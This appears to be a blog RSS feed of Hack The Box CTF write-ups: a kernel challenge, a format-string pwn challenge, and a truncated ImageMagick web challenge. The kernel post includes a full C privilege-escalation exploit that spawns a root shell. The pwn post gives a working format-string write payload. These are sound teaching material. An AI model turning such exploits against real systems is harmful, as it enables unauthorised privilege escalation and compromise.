<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Medium on Kvn11</title><link>https://Kvn11.github.io/tags/medium/</link><description>Recent content in Medium on Kvn11</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 08 Apr 2024 02:45:01 -0700</lastBuildDate><atom:link href="https://Kvn11.github.io/tags/medium/index.xml" rel="self" type="application/rss+xml"/><item><title>Kernel Adventures Part II</title><link>https://Kvn11.github.io/p/kernel-adventures-part-ii/</link><pubDate>Mon, 08 Apr 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/kernel-adventures-part-ii/</guid><description>&lt;img src="https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg" alt="Featured image of post Kernel Adventures Part II" />&lt;h2 id="setup">Setup
&lt;/h2>&lt;p>WORK IN PROGRESS&amp;hellip;&lt;/p>
&lt;p>This is the solution for HTB&amp;rsquo;s &lt;code>Kernel Adventures: Part II&lt;/code>, and in the process, we can learn and get an introduction to kernel exploitation.&lt;/p>
&lt;p>After you download the challenge, just follow the instructions in the README to get the required version of the linux kernel installed so we can take a look in our code editor.
However, you may get an error during the &lt;code>git apply&lt;/code> command.
To resolve these, you first need to run &lt;code>git checkout ff1ffd71d5f0612cf194f5705c671d6b64bf5f91&lt;/code> to revert the repo to the commit in which the vulnerability was introduced.
Now we have the code for the vulnerable kernel, and the author provided the image meant for the challenge.&lt;/p>
&lt;h2 id="goals">Goals
&lt;/h2>&lt;p>So I will take 2 approaches here.
The first is to do a code review to find the vuln by hand (eyes).
Then I want to build a fuzzer to automate the finding.&lt;/p>
&lt;h2 id="finding-vulnerability">Finding Vulnerability
&lt;/h2>&lt;p>So my first approach here is to look at the &lt;code>patch.diff&lt;/code> file to see what was changed.
There was a folder &lt;code>magic/&lt;/code> that was added.
Also, there is a new syscall &lt;code>magic&lt;/code> added to &lt;code>arch/x86/entry/syscalls/syscall_64.tbl&lt;/code>
However, the &amp;ldquo;meat&amp;rdquo; of the challenge is in &lt;code>magic/magic.c&lt;/code>, which fleshes out the syscall.&lt;/p>
&lt;p>Lets walkthrough what the new syscall does.
First it will initialize itself via the &lt;code>do_init()&lt;/code> function, but only if the &lt;code>initialized&lt;/code> value is not 0.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">do_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">uid&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">CHILDLIST_SIZE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">magic_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nextId&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">initialized&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This function sets the default username and password to &lt;code>root:password&lt;/code>.
It also defines a &lt;code>MagicUser*&lt;/code> called root.
Then &lt;code>kzalloc&lt;/code> is called and the resulting pointer is assigned to &lt;code>root&lt;/code>.
From my understanding, &lt;code>kzalloc&lt;/code> will allocate a chunk and initialize its memory to zero.
An important thing to note here is that this allocation will need to be freed at some point.
Anyways, this function pretty much sets the first user to be root, then creates an allocation for the next user, who will be the child of this root user.&lt;/p>
&lt;p>Now lets look at the individual actions we can get this syscall to perform.
Lets start with adding a user with &lt;code>long do_add(char* username, char* password)&lt;/code>.
First it checks if the user that will be added exists.
This is done by just iterating over the list of users, and checking the username against the supplied username.
Then an empty entry in the user list is found, which is where the new user will be added.
This works similar to the find function, where the user list is iterated over until a null entry is found, and that index is returned.
Then a search for the current user is conducted, but this time by uuid.
Again, this is just a simple for loop that compares uid, nothing special.
Then it will locate an empty slot in the current users child list.
Then another call to &lt;code>kzalloc&lt;/code> for the new user.
And the next user is given the &lt;code>nextId&lt;/code> value, which will be +1 from the previous.
We should note, that in no other function is there something to decrement the &lt;code>nextId&lt;/code> value, meaning it will always increase.
Maybe we could just create new users until we overflow the &lt;code>uid&lt;/code> value to be 0 again?
Seems possible, cuz &lt;code>nextId&lt;/code> is an unsigned short (2 bytes), so thats a total of &lt;code>0xFFFF&lt;/code> values.
Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID.
So if we get UUID 0, then we get the privileges of the root user.
Here is my exploit.
After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/syscall.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define MAGIC_SYS 449
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">long&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0xFFFFFFFF&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create the user
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uuid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">execve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Delete the user
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">musl-gcc -static -march&lt;span class="o">=&lt;/span>x86-64 -Os expl.c -o expl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>HTB PWN Pixel Audio</title><link>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</link><pubDate>Sat, 30 Mar 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/hackthebox.jpg" alt="Featured image of post HTB PWN Pixel Audio" />&lt;h2 id="locating-vulnerability">Locating Vulnerability
&lt;/h2>&lt;p>The challenge consists of a web server that allows a user to upload an mp3 file, and then plays that file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1.png"
width="1914"
height="925"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Really cool pixel art"
class="gallery-image"
data-flex-grow="206"
data-flex-basis="496px"
>&lt;/p>
&lt;p>Next, it is time to reverse engineer the application in binary ninja.
The code is pretty straightforward, there is a check to see if the uploaded file is an mp3.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2.png"
width="699"
height="212"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Main function"
class="gallery-image"
data-flex-grow="329"
data-flex-basis="791px"
> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3.png"
width="978"
height="755"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="mp3 check"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p>
&lt;p>In the mp3 check, there seems to be some &amp;ldquo;beta&amp;rdquo; functionality, which is where the code to reveal the flag is.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4.png"
width="653"
height="475"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Read flag"
class="gallery-image"
data-flex-grow="137"
data-flex-basis="329px"
>&lt;/p>
&lt;p>We need to change two of the variables to different values in order to trigger the beta function.
There are 2 &lt;code>freads&lt;/code> that occur in this function.
Both read from the mp3 file we upload.
The first one is a read of 3 bytes, which is meant to obtain the magic bytes of the file.
The magic bytes need to be the string &lt;code>ID3&lt;/code>.&lt;/p>
&lt;p>The second read is of size &lt;code>0x16&lt;/code> bytes, and is interesting because the read bytes are later printed via a &lt;code>printf&lt;/code> statement.
This makes me think that we could do a write via a format string vulnerability.
At this point, I don&amp;rsquo;t know if there is an overflow in any of the &lt;code>fread&lt;/code> calls, but we know that there is a pointer to the two values we need to change, which we can catch with a format string exploit, and then we can write a specific value to those addresses using a format string payload.
The next step is to verify these vulnerabilities with a debugger.&lt;/p>
&lt;h2 id="verifying-vulnerability">Verifying vulnerability
&lt;/h2>&lt;p>I built a PoC payload using the correct magic bytes, and used a cyclic pattern of &lt;code>0x16&lt;/code> bytes incase there is an overflow.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5.png"
width="639"
height="98"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="First payload"
class="gallery-image"
data-flex-grow="652"
data-flex-basis="1564px"
>&lt;/p>
&lt;p>Since we have a specific libc to use, we have to use the following command to run the binary:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_LIBRARY_PATH&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc &lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc/libc.so.6 ./main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Additionally the file is being called as &lt;code>/tmp/test.mp3&lt;/code> so we need to change the name and location of our PoC.&lt;/p>
&lt;p>Behaviour is as expected, no obvious overflow since stack cookie fail was not triggered.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6.png"
width="1282"
height="140"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Def a format string challenge"
class="gallery-image"
data-flex-grow="915"
data-flex-basis="2197px"
>&lt;/p>
&lt;p>Checking out a generic format string payload in GDB, I was also able to verify that there was no overflow.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7.png"
width="492"
height="174"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Format string vuln for sure"
class="gallery-image"
data-flex-grow="282"
data-flex-basis="678px"
>&lt;/p>
&lt;p>The payload starts at &lt;code>0x7fffffffdbd0&lt;/code>, and isn&amp;rsquo;t enough to overwrite not even the stack cookie, which is at &lt;code>0x7fffffffdbe8&lt;/code>
So at this point I am confident that this is just a format string vuln.
I am able to get the pointers to the values that need to change by referencing the 12th and 13th values on the stack: &lt;code>%12$p.%13$p&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8.png"
width="501"
height="170"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="The two addresses we need to write to."
class="gallery-image"
data-flex-grow="294"
data-flex-basis="707px"
>&lt;/p>
&lt;h2 id="exploit">Exploit
&lt;/h2>&lt;p>Since we now know where to write, we can craft our write.
The first write will be for 48879, and the second for 495.
The reason for this is that the after the first write (48879 = &lt;code>beef&lt;/code>), then we need to subtract that write from the second (49374 = &lt;code>c0de&lt;/code>).
So the payload becomes: &lt;code>ID3%48879x%12$n%495x%13$n&lt;/code>, which fits perfectly in our 22 byte restriction.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9.png"
width="596"
height="148"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Before printf"
class="gallery-image"
data-flex-grow="402"
data-flex-basis="966px"
> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10.png"
width="612"
height="146"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="After printf"
class="gallery-image"
data-flex-grow="419"
data-flex-basis="1006px"
>&lt;/p>
&lt;p>And that works just fine:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11.png"
width="689"
height="533"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Flag"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p></description></item><item><title>HTB WEB Prying Eyes</title><link>https://Kvn11.github.io/p/htb-web-prying-eyes/</link><pubDate>Sun, 29 Oct 2023 02:46:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-web-prying-eyes/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/hackthebox.jpg" alt="Featured image of post HTB WEB Prying Eyes" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: Welcome to the Prying Eyes, a &amp;ldquo;safe space&amp;rdquo; for those curious about the large organisations that dominate our life.
How safe is the site really?&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>The challenge involves what seems to be a leaks forum / marketplace, very reminiscent of RaidForums (RIP).&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/4.PNG"
width="917"
height="951"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/4_hu2daf908e9f049988721999c6f3a9721b_244231_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/4_hu2daf908e9f049988721999c6f3a9721b_244231_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Home page of the challenge site"
class="gallery-image"
data-flex-grow="96"
data-flex-basis="231px"
>&lt;/p>
&lt;p>Other than some interesting posts, doesn&amp;rsquo;t seem to be much else so I moved on to source code review at this point.
Right away, I noticed that one of the pages was using &lt;code>Imagemagick&lt;/code> which is known to have tons of vulnerabilities.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/5.PNG"
width="746"
height="241"
